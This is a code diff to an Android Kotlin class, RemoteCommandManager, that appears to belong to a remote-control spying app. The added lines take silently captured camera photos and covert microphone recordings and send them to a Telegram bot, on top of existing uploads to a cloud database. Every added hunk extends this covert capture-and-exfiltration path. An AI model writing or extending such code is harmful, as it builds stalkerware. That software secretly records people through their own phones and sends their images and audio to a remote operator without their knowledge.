@@ -1056,7 +1056,14 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload camera snap to RTDB: ${e.message}")
             }
 
-            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Cloud."
+            try {
+                val telegramBot = TelegramBotManager(context)
+                telegramBot.sendPhoto(bytes, "Captured $facingName photo (${(bytes.size / 1024)} KB)")
+            } catch (e: Exception) {
+                Log.e("RemoteCommandManager", "Failed to upload camera snap to Telegram: ${e.message}")
+            }
+
+            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Telegram & Cloud."
         } finally {
             cameraHelper.cleanup()
         }
@@ -1123,7 +1130,14 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
             }
 
-            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
+            try {
+                val telegramBot = TelegramBotManager(context)
+                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.3gp", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
+            } catch (e: Exception) {
+                Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
+            }
+
+            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram & Cloud."
         } finally {
             audioHelper.cleanup()
         }
